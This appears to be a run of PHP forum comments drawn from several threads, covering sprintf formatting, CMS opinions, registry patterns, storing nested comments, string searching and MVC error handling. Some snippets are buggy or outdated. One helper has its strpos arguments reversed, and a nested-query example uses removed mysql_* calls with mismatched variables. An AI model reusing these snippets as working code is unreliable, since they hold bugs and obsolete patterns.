Instead of something like: &lt;?php echo 'I had ' . $numA . ' apples before ' . $perp . ' took ' . $numB . ' of them!'; ?&gt; you can write: &lt;?php sprintf('I had %d apples before %s took %d of them!', $numA, $perp, $numB); ?&gt; It's not a huge timesaver (unless it actually is, in the background) but I've always used it to keep code legible in circumstances like the above. 
I use sprintf() to keep things tidy, I also use it for padding zeros to integers when I need an incremental ID or something e.g (000001 instead of just 1)
And right when I need it too :|
The problem with online reservation system is that they need to hook into an existing database of some sort. Often, reservation management systems such as Digital Rez's ROS will have a component that performs that function, at a price. Alternatively, there are numerous services available that perform this function. Otherwise, you simply have to hack something together. I had been working on an open-source [PHP-GTK-based hotel management system](https://github.com/TheFrozenFire/PHP-ROS) for a while, but it's a hard market to enter.
I'm using ExpressionEngine at work. It's a good system, but its templating system keeps me from recommending it and from using it again. The proprietary syntax is a constant annoyance, and while it allows you to use PHP in templates, you can't use PHP and store templates as files at the same time. I've moved us pretty far away from actually using Expression Engine proper. I use it's content management, but I've essentially moved almost completely back to a CodeIgniter system using an EE module. It gives me the flexibility I need but still lets my non-techies still manage content. Their Control Panel is also pretty hard to use. I get the feeling that EE has fallen behind the times and they can't work on it fast enough to get it all up to speed. Edit: EE's way of storing custom data by creating another column for each custom field also irks me, coming from a WP background. I much prefer how WordPress handles their meta tables to EE.
Mega fail leaving error display on. 
Nice man! Do you have an online demo of this?
I do think the market is ready for a new system, though. I work in accommodations, and we've been searching for years for a better, newer system to use. We're currently on Digital Rez's ROS system, which is a mess of hacks. For online booking, we use [Quokka](http://quokkasystems.com/), which is another mess of hacks, and is very ugly. If someone with enough capital could launch a half-decent booking system that is accessible to small businesses (preferably room-count-based pricing), we would jump on it.
&gt; while it allows you to use PHP in templates, you can't use PHP and store templates as files at the same time. Sure you can! You can use PHP in any template you want, saved to file or not. You just need to enable PHP for the template in the Template Manager. However, it's sooooo easy to move PHP into their own plugins that you should basically never put PHP in templates. This really helps with separation of concerns, and keeps everything really well organized. There's a great PHP plugin packager that'll quickly generate the plugin file structure for you. Check it out: [pkg.io](http://pkg.io)
edit: misread question. Deleted.
Also interested in the answer to this. I've been assigning the registry locally as well
I've also wondered the same thing. There are a million startups popping up trying to solve non-existant problems instead of solving some of the existing problems that can be solved by not too much capital. Sigh.
That bug report sort of bugs me: &gt; Submitter: This *specific page* doesn't work. &gt; Dev: Hm, looks like the *whole site* is down. &gt; Submitter: O RLY? I didn't bother to check LOL. Maybe I've just dealt with too many bad bug reports before, but it would be nice if people applied a little more common sense before submitting these reports. It takes two seconds to figure out that it's more than just that page, and it's better for the developer to have a better scope of the issue.
We'll always have Craigslist.
Looks interesting. I've been looking for a new open source CMS to try out. 
One thing a lot of people forget to mention is performance (Speed &amp; Memory). Wordpress uses 5MB, Drupal uses 6MB, modx uses 5MB, sliverstripe uses 12MB. Memory usage is about double that if you are not using a PHP cache like APC! Most of them also take about 0.5-1 seconds on commodity hardware. 
Thanks, would love to hear your $0.02 if you get a chance to try it out!
If you want `load()` to work locally this is a much better way to do it than assigning your local $load to another function.. 
This is a far more elegant solution to what I had. Thank you. 
well, if you were going for flexibility, don't couple your view to your controller. Simply have a View class which takes a path to a file as a parameter, pass in variables the view needs, then a render function for that class. this helps, because now you can replace that view class with an entirely different class, that only needs to accept a file path as a constructor argument, allow values to be set and retrieved from the object(using __get and __set) and a render() function. Leaves room open for alternatives like mustache or twig or any other templating language. HMVC is MVC with the ability to make a seperate url call inside the same request. It doesn't touch the webserver again, it's all internal. An example would be if you had a page specifically for comments on your blog posts, you could do something like url::request('comments/12345') and it would return html. Internally, it would pull up the controller for your comments page, pass in 12345(a blog post id number), which then your comments controller would query the comments table, pass the data to a view, to be formatted and printed to the screen. the url::request function would instead take that, and return it as a result. Kohana does this already, check it out if you're interested.
that's a valid concern, but Drupal really is a fantastic CMS.
I do Drupal work to pay the bills so I'm not saying Drupal itself is bad. I just hate dependencies between something internal and external, especially when the activity level is questionable. If you stick to the core Drupal modules and don't try to turn it into something that it isn't, I'd agree that it does a good job. I've had clients that want to turn it into CRM software, and let me tell you it did not work out so well for them. I urged them to only import the users needed, only add the profile fields that were of critical importance etc. What do they do? Yeah, I end up importing every user from 1980 on so they have 3k users each with 50, that's FIFTY additional profile fields and they want to regularly export "all that data" for who knows what purpose. Of course profile_csv is choking on it because all of those fields are stored in a completely denormalized fashion. Before you ask, no they won't give me specifics. They just "have to have it". They completely lack any ability to be reasonable, so I'm thankful that we are not working with them anymore. I have another client who wants pins on a map. Always with these damn pins and maps. This particular map? Yeah, it nearly crashes any browser I open it in and it takes forever to load because it has TEN THOUSAND PINS! Sorry, just a bit of client rage coming out there lol. TLDR: Let those who pay the bills damage the site in a manner of their choosing.
Thanks.
Consistent formatting, just like printf. sprintf just allows you to keep the text in a variable before you choose to output (or do something else) with it. for ($i = 1; $i &lt;= 10; $i++) { printf("%2d %50s\n", $i, str_repeat('abc', $i)); } would print: 1 abc 2 abcabc 3 abcabcabc 4 abcabcabcabc 5 abcabcabcabcabc 6 abcabcabcabcabcabc 7 abcabcabcabcabcabcabc 8 abcabcabcabcabcabcabcabc 9 abcabcabcabcabcabcabcabcabc 10 abcabcabcabcabcabcabcabcabcabc but using for ($i = 1; $i &lt;= 10; $i++) { echo $i, " ", str_repeat('abc', $i), "\n"; } would output 1 abc 2 abcabc 3 abcabcabc 4 abcabcabcabc 5 abcabcabcabcabc 6 abcabcabcabcabcabc 7 abcabcabcabcabcabcabc 8 abcabcabcabcabcabcabcabc 9 abcabcabcabcabcabcabcabcabc 10 abcabcabcabcabcabcabcabcabcabc
Drupal 7 and Drupal Commerce Nice :)
lol, it's ok, I freelance myself, so I feel your pain. drupal isn't the solution to everything, and a lot of times I think people abuse CMS's, but from a technical perspective, I really enjoy working with Drupal. I've seen people complain about it, but imo the API's are very well designed.
It's well understood that implementation inheritance should generally be avoided unless there's a clear win using it, and the reasons have little to do with the Liskov Substitution Principle, and more to do with shared state. LSP is simply a means to try and increase the genericity of inheritance hierarchies. 
Just in case we're misunderstanding each other: EE does both. 
ah right, didn't know that. Come to think of it some 3rd party DNN modules did it too, DB templates are not fun moving dev/staging/live.
You think it has potential but you are not confident enough to give us any clues what it does?
Look at some others: vbSEO, fmyscript, aavardtopsites, &lt;any forum software&gt; etc
He is not providing a link, fair enough, but a clue would be helpful. Is this a social networking site sold as a service? Is it a library of raw code to include in other prodects? Is it a new PHP server? &gt; How do you package it, etc? Put it in a box? Sell it with another service? Give it away with hosting? Sorry, we need some pointers to be able to say anything useful. Well, I do, at least. However, a link would be fine with me.
The PHP website (a website *for* programmers) is powered by open source PHP code. Leaving error display on is like saying, "you're one of us, here."
Both the original question and answers appear to conflate the idea of a registry and a "loader" type class somewhat. I believe the OP is actually trying to store a loader object in the registry not use th registry to load stuff itself. Generally speaking autoloading is the way to go but with something like a view file you'll still need to manually load it or follow a convention that allows them to be loaded automatically (e.g. Zend Framework does this). Either way if the question is about registry and the fact that it contains a loader is arbitrary then the answer is - no I don't think it really matters where you assign things to the registry as all the registry is supposed to do is provide a global scope for random objects you wish to be available. It's better than singleton because you might have several of the same class in there such as a FireBug log and a normal static log. I would suggest that most stuff that is important enough to go into the registry should be defined at the earliest possible time so if you bootstrap the application I'd do it then, otherwise some sort of init method on the controller would work. Broadly speaking I wouldn't get too caught up in wanting to be able to call everything via $this as it will probably end up being more confusing in the long run and not really save any effort. A better way to handle it would be to actually pull references out of the registry into class scope and store them in private class-level variables. so you might have //inside a bootstrap file Registry::set('loader', new Loader()); //inside an init method for the controller $this-&gt;_loader = Registry::get('loader'); //in a method/action $this-&gt;_loader-&gt;load();
&gt;Decide whether you want to encrypt your source code (e.g licensed software), if so, I'd recommend ionCube. Please don't do this. All it does is punishes people who legitimately buy your software by introducing more headaches and overhead they have to deal with.
Depends on what it is. Can you tell us what market it serves? Would it make sense as a hosted service, or is it a self-hosted solution? Is it for a single user? Multiple users?
For a school system... I don't think it's worth it. If it were me, I'd just use javascript to chuck a block quote of the comment the poster wishes to reply to. Same sort of thing as most flat-level boards such as phpBB3 or vBulletin currently do it. Wanting this sort of thing sounds like feature bloat, to me. Otherwise, the common way to implement a tree structure in a database is to use [this](http://en.wikipedia.org/wiki/Nested_set_model). The four links at the bottom of the references, and indeed, the rest of that guy's blog, look *really* good.
MySQL comes with a whole bunch of built in functions/operators for sorting data. GROUP BY may be of some use to you. I'd personally gather all the comments for a post into an array. Loop through this array starting with comments without parents, using a recursive function (array_walk_recursive() or custom) to find the children and remove them from the array once they've been returned Its fairly straight forward - recursive functions can be annoying though
Indeed, in your example everything needs to be comments. So all comments relate to your blog in your model, besides that, every blog can have a comment as parent. So the table `comments` has a comment_id with value 0 for the top comment and the id of a comment it refers to. This way you can iterate every comment for children comments.
I second what this guy says, you can throw together a simple blog with drupal in just a couple of hours easily. When I started I built my own blog from scratch and you will go insane tying up the loose ends in the code. 
This is horribly inefficient, but should get you on the right path. Suppose you want comments for post 47: $result1 = mysql_query('SELECT * FROM comments WHERE post_id = 47 AND reply_id = 0'); while($row1 = mysql_fetch_assoc($result)) { echo '&lt;div&gt;'.$row['text'].'&lt;/div&gt;'; $result2 = mysql_query('SELECT * FROM comments WHERE post_id = 47 AND reply_id = '.$row['comment_id']); while($row2 = mysql_fetch_assoc($result2)) { echo '&lt;div&gt;'.$row['text'].'&lt;/div&gt;'; $result2 = mysql_query('SELECT * FROM comments WHERE post_id = 47 AND reply_id = '.$row['comment_id']); while($row2 = mysql_fetch_assoc($result2)) { echo '&lt;div&gt;'.$row['text'].'&lt;/div&gt;'; $result3 = mysql_query('SELECT * FROM comments WHERE post_id = 47 AND reply_id = '.$row['comment_id']); while($row3 = mysql_fetch_assoc($result2)) { //Ad inifinitum - if you actually use this method, you'd have to put a limit on comment nesting. } } } } Now, if I were implementing comment nesting in a serious manner, I'd be storing metadata in my rows to group things together. [This article](http://www.sitepoint.com/hierarchical-data-database/) should give a few points on doing it a little more correctly (note the multiple pages in the article).
Not sure if would work on an intranet, but you could try[Disqus](http://disqus.com/) for a 1-line solution.
I'm more a fan of teaching people properly from the start. For instance, if I were to point a person in a direction to learn HTML and CSS, I'd point them to the HTML and CSS concept pages in SitePoint's Reference section, as it goes through those topics quite thoroughly. I don't trust people to know that they need to research things deeper, as more often than not they don't read further than what it takes to achieve a specific task. And, as we should all know, just because it works, it doesn't mean it's necessarily right.
It's a great exercise though. If he builds it on a MVC framework and incorporates some AJAX (when someone posts a comment maybe), he'll be pretty well equipped for most PHP-related gigs.
I'm not sure this works for arrays. In this case, haystack is a string, and needle is an array of strings I want to search for in haystack. The ugly way is a for loop through the elements of needle.
I think what you're looking for is: [array_search()](http://php.net/manual/en/function.array-search.php) EDIT: nvm, I misread your post, Fustrate is correct.
For one, you have ~2 downvotes, which may not even be accurate due to vote fuzzing. Secondly, ~2 downvotes is nothing; when you get -10 or -20, that's when you need to reevaluate your comment. Thirdly, it doesn't appear that you actually have any insight into the problem, and instead just took a 'wild stab' at it. Nothing wrong with that, but when you appear to be really off-base, people will downvote. Let me explain why it appears you don't have any insight: &gt; MySQL comes with a whole bunch of built in functions/operators for sorting data. GROUP BY may be of some use to you. Anyone using SQL should know about GROUP BY, and suggesting that someone use it is pretty much worthless. On top of that, I don't see how GROUP BY is relevant here. Yes, you may need it in your query, but it's by far not the crux of the problem; how are you going to obtain a set of data that represents a potentially highly-complex hierarchical tree-structure of interdependent data? That's the SQL side of things, and I can tell you that GROUP BY will have very little to do with success in this arena. &gt; I'd personally gather all the comments for a post into an array. Loop through this array starting with comments without parents, using a recursive function (array_walk_recursive() or custom) to find the children and remove them from the array once they've been returned So basically, you're suggesting that _for each item in the array_, you should do a recursive walk on it? I suck with big-O notation, but I think that would be pretty high up there.....like O( 2^n ) or something, which is very, very bad. Basically, the more comments you get, your app will get disproportionately slower.
using strpos function find_it($needles,$haystack){ foreach($needles as $needle){ if(strpos($haystack,$needle) !== false){ return true; } } return false; } $str = 'petejoohnsam'; $arr = array("horse","key","john", "sickle"); if(find_it($arr,$str)){ echo "you go girl!"; }else{ echo "oh no you didn't"; } 
Try this: function in_string($needles, $haystack) { foreach((array)$needles as $needle) if(strpos($needle,$haystack) !== false) return true; return false; } Usage: $needles = array("horse","key","john", "sickle"); $haystack = 'petejohnsam'; return in_string($needle, $haystack); // returns true; You can also use it with just one needle: $needle = 'john' $haystack = 'petejohnsam'; return in_string($needle, $haystack); //returns true
I like when someone comes up with the same solution as me. makes me feel validated. have an upvote!
I guess that works, but I was trying to come up with something less sassy.
Totally agree, don't try to reinvent the wheel. For educational purposes, of course, by all means, create a blogging system, create a forum, create a framework, but bare in mind that a lot of smart people (smarter than you or me) had already created what you're looking for.
It's called Marketing, building relationships, and SEO - Search Engine Optimization.
&gt; 'I did it before, so I'll copy and paste, rather than remember' That's more or less all coders, except some are more inclined to write libraries that they reuse, instead of copy-and-pasting code all the time. Writing everything from scratch all the time would be extraordinarily inefficient and dull. And actually, nested comments are not especially simple. My suggestion would be: make a comments table with columns for parent article and parent comment. If they're viewing article 72, you'll grab all comments with a parent article of 72 and their respective parent comments. Comments without parent comments will be the root of each tree. 
A little bit crazy, but there's no looping except internally: function array_element_in_string($array, $str) { return (bool)array_reduce((array)$array, function($a,&amp;$b)use($str){ return $a | $b = (strpos($str,$b) !== false); },0); }
true. wait, how do you enable cURL in the php.ini file?
also true, I was just saying instead of having to handle the $found array in your example. I honestly don't use the boolean typing very often and I should 
Aww... isn't u cute. Taking the time... You should be a teacher. 
There are no parameters to bind. $this-&gt;table isn't a parameter, it's an identifier.
hmm i've been looking into sphinx and i like it. Not that that matters but, could you help me with some of the steps of setting it up? I am following this article here: http://www.sanisoft.com/blog/2010/01/11/sphinx-search-engine-and-php-installation-indexing/ But I am new to git and building. I was able to to step 1 lol, but how do i do step 2, 3, and 4 under "installation". What do I type in terminal to configure it as in step 2 and then build and install it? Shouldnt I first unzip the tar ball in my testServer's root folder?
Glad you agree. The article I posted is a much better solution.
ah ok
There is an LDAP module for Drupal. Not sure if it will be compatible with your system butm if it is, listen to these guys. Don't reinvent the wheel unless purely for your own education or if your organization NEEDS proprietary software. http://drupal.org/project/ldap_integration
Just for the hell of it, here's another less-obvious solution: function in_string($needles, $haystack) { $match = false; str_replace($needles, '', $haystack, $match); return (bool) $match; }
While I agree, we have to also realize that reddit is fundamentally different than a site like SO; as you may know, SO places lots and lots of value in their user ratings and votes -- it's practically what drives the site and gives it credence. However, karma points are worthless insofar as a means to determine who "good" and "bad" posts and users are. Also, SO has very strict guidelines for administering votes, and even controls in place to prevent circumventing these guidelines (such as _"you need X reputation before you can \_\_\_\_\_"), whereas here, the meaning of a point of karma varies between subs and users both. Some vote based on actual rediquette (whether or not you contribute to the discussion), while others, especially in the more concrete programming subs, will vote based on the accuracy or applicability of your comment. Others vote based on comedy. In short, there's no telling why 1-2 people downvoted you; it could be as simple as they didn't like your username, or maybe _they_ completely misunderstood the question (and thought you were trolling, etc.), or perhaps they're just a deranged psychopath... all are possibilities. So, don't let it get to you unless they get into double-digits, then you might want to take a closer look at the situation. On the other hand, if you're merely concerned with improving your technical skills, reddit is certainly good for that, but other sites like SO are much better suited to such pursuits.
I actually disagree with this viewpoint when it comes to learning. If OP is a student (or at least a teacher/IT staff who is new to PHP) then they might as well learn by doing something that's been done before. I learned a lot of PHP back in high school doing simple things that have obviously been done before, such as quiz generators and guestbooks and the like. It's good practice, even if you don't do it as well as the standard cut-and-paste tools available might. Also, sometimes it's just fun to make your own, if you have the time and enjoy the experience. If it's just a case of "I need *x*, if I don't have to make it myself that's great" I'm sure OP would already have considered this.
You've summed it up perfectly. As an active member of WPSX I know the value of reputation and should have known to take reddit voting with a pinch of salt!
This is a terrible idea. Reordering comment id's is bound to cause issues, mostly, you're going to run into race conditions where two people submit comments at the same time and you now have to distinct threads trying to contend for the reordering of (what should be) primary keys in a DB table. The top voted comments for "commentId, parentId" and reconstituting in php are dead on. There are very few other ways of doing that are worth thinking about, and what you propose here is definitely not a good idea.
[Official Installation Instructions](http://sphinxsearch.com/docs/2.0.2/installing.html) The short of it is you won't need special configuration with it. I do question how successful you'll be if you're not a programmer and are just trying to copy and paste things together though. :/
&gt;One day the page format is going to change on you and you'll be screwed. If you really have to scrape then use DOMDocument and search for nodes with XPath. Using DOMDocument + XPath is going to be just as likely to fail when the document structure changes as a regex would. Using the regex in this case really isn't all that stupid at all. Also, I thought the dominant color example was the coolest one listed..
&gt; but often more than 2 nested loops is a sign of bad coding. No it's not. It's just a sign of complicated data structures.
i am a programmer, i am just kind of new to PHP. not completely new, I know the syntax and have wrote programmes in PHP before, but nothing at this scale. In fixing the cURL script I linked to in the post I was hoping to just copy and paste things together, but i don't know if anyone is going to help me that far. I just printed out the script and I am reading it through to figure out what parts use cURL so that I can use the zend_http_client or guzzle instead. So far I know its used on lines 109-119, 256-273, and 455-507. Thats a start, right? I know everyone is saying it would be easier to just fix the server, so I am going to contact my friend and see what he says. In terms of sphinx I was trying to start from scratch and not ditch the old script :-/ Do you think you could help me and / or myself (alone) or together we could successfully get it working?
No, it's not just as likely if you're smart about your XPath queries. 
As long as you use a glue that is never part of the string: function in_string( $needles, $haystack ) { return strpos( implode( '::', $needles ), $haystack ) !== false; }
&gt;It all uses AJAX heavily so there's no page refreshing So you basically re-invented the browser inside a browser? There's nothing wrong with a full page request, Ajax is useful for altering pieces of the page not the whole thing.
Exactly my approach at my work. Each comment has a parentID, so if you query a comment, I recurse up the tree to find the path from the root, so I can show it on screen at the proper nesting depth (with a second recursive function, fun!).
I said that wrong, I use it to populate elements on the page based on user selection. I don't do whole page ajax calls, not that much of a cowboy.
Complicated data structures are often a sign of bad coding, also ;) Seriously though, how often do you work with complicated data structures? Not all the time. Therefore, more than 2 nested loops can usually be refactored into something simpler or quicker.
Awesome, glad I was wrong. 
It appears I'm behind the times, I've got some reading to catch up on. Thanks for the information!
I am always ready and willing to admit something sucks. We can put on that list: GoDaddy, PayPal, CakePHP, MySpace, Emo music, Lloyds TSB online banking, nearly anything made by Microsoft - and not just bought by them, Strongbow cider and Canadian cigarettes. The reason I've never outright said I think Kohana sucks is because I don't think it sucks. I like a lot of what it has done but there are bits I don't like. I'm not being a pansy and "beating around the bush", I just actually like a lot of the work. I don't know why you seem so intent on trolling me shadowhand, I've never insulted you or said anything that should piss you off, but you do keep acting like a child to me. Please stop it.
When you admit that CodeIgniter has _massive_ flaws, and continues to mislead their users into thinking that it is an open project, maybe then we can have a real conversation. Sad thing is, you are probably a really intelligent and nice person, but you need to stop drinking the EllisLab Koolaid.
http://stackoverflow.com/questions/192220/what-is-the-most-efficient-elegant-way-to-parse-a-flat-table-into-a-tree/192462#192462 The answers here cover this in depth. The key is knowing to Google MySQL hierarchical data.
I would throw a 404 Not Found error in the controller, and handle it nicely, displaying an error page. View should have no logic. Model doesn't really exist, so can't know that. Gotta be the controller.
I agree that you can probably build this in house. I see some are saying "don't reinvent the wheel," *which I can agree with.* If you're **in it to learn,** then I'd highly recommend taking a look at my [gigantic comment/solution here](http://www.reddit.com/r/PHP/comments/oufy9/to_blog_or_not_to_blog/c3kd9tf) (with code sample). There's **absolutely nothing wrong** with reinventing the wheel if you're just trying to learn! Also, I see there are [several theories here](http://stackoverflow.com/questions/192220/what-is-the-most-efficient-elegant-way-to-parse-a-flat-table-into-a-tree/192462#192462). I'd very strongly suggest the "parent" column approach. The reason why is because it's the simplest approach and solves this problem perfectly. Particularly because each **comment only has one parent** anyway. The way I group this is into two main tables: 1. The blog post table (which I don't discuss in my solution). 2. The comment table, which holds all the comments and their references to who their *single* parent is. Since each comment has a **single parent**, you simply need 1 column indicating who that parent is. The default parent ID should be zero. Zero has special meaning here, since it means "I don't have a parent." All comments will be associated with a blog post, so all of them will already have a "blogid" column (sorry if this isn't super normalized, it's very practical folks). So -- the basic process is this: * Get yer' blog post * Get all comments for your blog post, grouping them by their parent (default parent is 0). * Use an iterative function to loop through all comments and their parents, starting with parent 0 and letting the iterative function do the rest of the work! Very simple, as far as I can see, honestly. **[Again, see my solution for details and a code sample.](http://www.reddit.com/r/PHP/comments/oufy9/to_blog_or_not_to_blog/c3kd9tf)**
#1, though I could see certain arguments for #2. Generally, you'd want all the logic to be in your controller. However, I could see a situation where you would want your view to be able to handle the case where 0 records were found. If you have a bunch of views that will all display the same "not found" message, then that should just be a separate view called by the controller. However, if each view is going to display the same stuff as it would if there were information (like table headers) but just have a slight change to "0 records matched your search" spanning all the columns or something, then I could see adding that logic to the view. Once you go down this road though, every view has to be able to handle the case where you return no results, so be careful you don't burn yourself for later. Unless you've got a compelling reason to go this way, I'd handle it all from the controller. 
This wont work for all arrays, but for really simple string comparing, here is yet another way to make this search. $haystack = 'petejohnsam'; $needles = array('horse','key','john','sickle'); function in_string($needles, $haystack) { $pattern = "/". implode("|", $needles) ."/"; return preg_match($pattern, $haystack); }
This makes the most sense, I think. It never occurred to me to handle it just like a normal 404 error.
Is there an exception handler or something in ZF that I can basically say, "yo, just go to this template for 404's?"
You're welcome.
The comments on here have been really useful, but they've certainly proved your first point. In my head it all seemed quite straightforward, I just couldn't understand the logic of it, but I've certainly set myself a task it seems.
Same here. I've built very robust systems while applying the KISS principle wherever possible, which is useful in IT if you ask me. Keep it simple, stupid. Don't overcomplicate it. 
Why would you assume I blindly follow what EllisLab say? I have loudly challenged many of their decisions and am the first to point out when an idea sucks. Obviously CodeIgniter has it's flaws and I have never pretended that it doesn't, that is why we have the project on GitHub. We've had contributions from over 105 contributors who have all helped to fix various problems and close down issues that have been standing in CodeIgniter for a long time. It's not the same project you fell out with years ago and you need to accept that. As for things beyond small bugs - which the community has done a great job of taking care of over this last year - there are larger issues to address, such as the singleton (a.k.a super-global) pattern. We could rip it out right now and recode the whole damn thing, but then we need to force users to re-build their applications. While that may be an architectural change that the Kohana devs are happy with this is not a choice that CodeIgniter is willing to make. Different projects do things differently, such is life. Does that mean CodeIgniter will never implement a new loading syntax? Hell no, I would love to see one in CI 3.0 and might build it in myself shortly, but it would have to be done along-side the old system. I have a whole bunch of commercial applications running on top of CodeIgniter and it does exactly what I need. I have portability, simplicity and it's on top of a framework so simple that almost any PHP developer can hop in and contribute. That is EXACTLY what I need and it what plenty of other developers need, wether or not it has all the bells and whistles of other frameworks is entirely beside the point.
I'm not sure what "it doesn't make CI libre." means, but I think you still have a bee in your bonnet about the whole CI/BlueFlame/Kohana deal. Essentially this boils down to: "You don't like EllisLab". Well why do you care? You don't think they've changed based on their words alone, but the community who use CodeIgniter every day can see the changes for themselves. We have Reactor engineers contributing code and handling peer review, the community is pitching in, EllisLab are helping the community grow with sponsorship for CI conferences and we're all chugging along nicely releasing websites and applications - which at the end of the day is the point of all this right?
You're probably right, and I obviously no longer participate in the CI community. All things considered, I still have a damn good reason to not like EllisLab. (Of course, all that evidence has been destroyed by EllisLab to polish their image... and never once has EllisLab admitted how rude they were.)
I'm a big fan of Fat Model Thin Controller (look that up). Basically, most logic should be in your model (validating, etc.), and the Controller should solely be responsible for loading the correct model according to the request and pass that on to the appropriate view. I'm not sure exactly what you're doing, but I suppose someone is trying to look at the profile of a non-existent user. In that case, I would make the controller load a 404 Not Found response. If you are looking up a list of users by certain criteria, and no users are found, I would hold the View responsible for showing zero results in a correct way. Disclaimer: this may be cutting corners a bit and maybe even partly incorrect, since it's been a while since I've worked with PHP and ZF. Read up on Fat Model Thin Controller to be sure :)
I agree, though, while the developer is free to create his own implementation, the models provided in the example projects do not show this behaviour. Instead, they rely on checking whether the query succeeded in the following manner: if (null !== $userProfile-&gt;getId()) { //Success! }
I wrote something like this recently in ZF for a test thing I had to do for a job (see readAction and _getRecordOrFail). https://github.com/warmans/jditest/blob/master/application/controllers/IncidentController.php Basically I just set some flashdata and redirected back to the index. Not sure why I didn't set the 404 status - but I'd also do that as others have suggested. This can be done with the zend redirector. To use an exception you can just throw Zend_Controller_Action_Exception('not found', 404);
Just implemented it and it works amazingly. Thank you so much, dead easy to understand, quick to execute, superb.
I always thought that was the correct way to do MVC, model is almost always the largest of the three 'parts'
With regards to the view having no logic, how should I handle a navigation, which changes depending on the users privileges? I'm currently using a single view containing basic tests (example: if(isAdmin)) to determine which navigation to display. Would it be better to have multiple views with the logic in the controller?
My first MVC experience was with Synfony, which I struggled to grasp, so I built my own 'framework' to get a better understanding of the structure I've since dabbled with CI, Zend, Yii, amongst others, but keep finding myself going back to the homebrew and rewriting what I've learnt, to improve my knowledge. I guess, due to the nature of MVC, each framework does things slightly differently. Most apparent seems to be the way logic is handled in the view Thanks for clearing that up!
Haha, that's awesome! I'm glad it worked for you. It's cool you got it to work and got what you needed, even though you were "reinventing the wheel." if you learned (and had the time) there's nothing wrong with that, as experience is the best teacher. To be honest, I haven't run/tested this particular code myself. However, as I mentioned before, I've done it many times before and, when working with single parent higherarchies, this is the best architecture (and again, why over complicate).
I do the #2, but the way I get around it is every view has a viewCompontentFactory. The factory then has a method getErrorMessage that the view then uses. The logic of 'there is no data in the stack, show error' is written in the base view. I simply give the view a different factory to then change the error message.
Documentation?
Eh, not much point if it's only for personal use?
Ah, I see. Fair enough, I'll write some documentation then! I've never done the documentation thing before, do you have any tips, etc?
You're building this for you, so don't listen to all the naysayers about having to document everything. I went ahead and looked at your well commented source and here's a list of things I think you need: 1. get rid if your load class, it's only serving to create a unique API to your framework for referencing another class. You can easily just call the class you need since you have a wonderful autoloader. 2. Your autoloader is great, but will need some work to function on windows, while windows may not be a perfect environment for running php, it's great for testing. 3. Think about some way of allowing for extensions to the code base, which don't involve dropping code into the same folder as your framework and application code. 4. In your database library your example shows using $db-&gt;connect()-&gt;prepare('...'). The -&gt;connect() portion doesn't make sense, it should connect if a database object has been initiated. This would be a wonderful case for a singleton as well, so other parts of the code can either do new Db or Db::instance() depending on how they want to proceed. 5. Look into some advanced kind of ORM or ActiveRecord library, you'll learn a lot from the process. 6. Consider some other libraries to aid in development, generic functions to deal with arrays, dates, or text would be super useful. 7. Make a library for session handling 8. Make a user authentication library. 9. A command line script to easily generate empty controllers. 10. Don't handle errors in a special way, just worry about handling exceptions. You can make a general framework exception, and put a try/catch around your dispatch library, which would catch any exception thrown anywhere in the framework. You can do all sorts of awesome stuff once you've caught the exception, such as clearing out whatever was sent to the buffer, replace it with an error message, include a stack trace, logging, etc. You can optionally squash the exception and log it, let the page load continue(or end rather). Point is, it's a better option than what you have. If you converted your 404 error to an exception thrown by Router, it will fall right in line with the exception idea. 11. Extra Credit: Figure out a way to do a database config driver. This can prove extra difficult because you'll need to access the config class and a file based config driver first to even get the database connection details. Good luck!
No, demons use exec();
&gt; You wouldn't even do it yourself if it was your framework. &gt; So why are you expecting this guy to do it? I'm not expecting him to do it. I'm just telling him what would need to be done as part of going down the path he wants to go down. It's like if you ask me for directions on how to get to the local history museum, I can give you those directions despite being too lazy to actually go to the history museum myself; and giving you those directions despite being too lazy to go myself would be the helpful thing to do. &gt; it's clear you didn't want to help him Actually, it seems to me like I *do* want to help him. That's why I'm offering him advice. Not only did I directly answer his question, but I then noted that his question might not even be the most effort-efficient approach of solving his underlying problem. I.e. rather than asking people what features he might be missing (which would require for those people to know what features are already present, which would require the exhorbitant effort of writing out documentation), it might be easier to just look at other frameworks and see what feature they have.
Unit tests.
&gt;I'm not expecting him to do it. I'm just telling him what would need to be done as part of going down the path he wants to go down. It's like if you ask me for directions on how to get to the local history museum, I can give you those directions despite being too lazy to actually go to the history museum myself; and giving you those directions despite being too lazy to go myself would be the helpful thing to do. That's a horrible analogy, he wasn't asking anyone to fix his framework for him, but to suggest what he does next. &gt;Actually, it seems to me like I do want to help him. That's why I'm offering him advice. Not only did I directly answer his question, but I then noted that his question might not even be the most effort-efficient approach of solving his underlying problem. You really think telling him you weren't going to comment until he wasted time on documentation was directly answering his question? The approach you gave him wasn't efficient at all, it only suited your laziness, which again, if you didn't actually want to help him, why bother commenting? &gt; I.e. rather than asking people what features he might be missing (which would require for those people to know what features are already present, which would require the exhorbitant effort of writing out documentation), it might be easier to just look at other frameworks and see what feature they have. Just want to make sure I have this right. You wanted to comment here, I'm guessing for some kind of karma, since your post wasn't helpful. You first suggest he does something you wouldnt, then instead of reading the 10 MAYBE 15 files in his framework(most are under a 100 lines of code, none above 500) you suggest he look at every other php framework and glean ideas from that, because with as many frameworks that exist out there, that's clearly a better option than, ohh I don't know, actually giving him some advice? Seriously, why did you actually comment, you weren' even trying to be helpful.
Any recommendations? 
I don't think I'm in favor of this, but I really need more information to be sure. _If_ a user with an ID of 1 exists, but simply hasn't populated their profile (or what have you), then a 404 would be misleading; however, _if_ no such user exists with ID 1, **then and only then** would I throw a 404. The OP doesn't give these details, though.
Perhaps I am not understanding the benefit of DI. I've always been taught that the person (or future me) using an object shouldn't have to think about what the object or method needs, it should just do it automatically? I believe there is a term for this but I am lost of it now. In fact I had a CS teacher tell me if your constructors and methods need a lot of parameters....you're doing it wrong.
I agree that if you have too many parameters in your constructor or method you are doing it wrong. However, that doesn't mean the answer is to hide the dependencies. Perhaps you're attempting to do too much in one class or method. Limit your class/methods to a single responsibility and DI becomes easier to accomplish because you don't need as many dependencies.
Kudos. Hope is under an hourly rate and not some sort of per-feature fixed priced.
You should have mention it to him rather than make assumptions. You asked something specific: he provided something specific.
[pChart](http://www.pchart.net/) is a good lib. However the features you mention and the amount of data you plan to visualize need other technologies. Flash in the front-end is the best idea I personally think and limit as much as possible the datasets to a per-user-call in the back-end (php/db).
I would look in the top of your index.php file and see if you see anything funky.
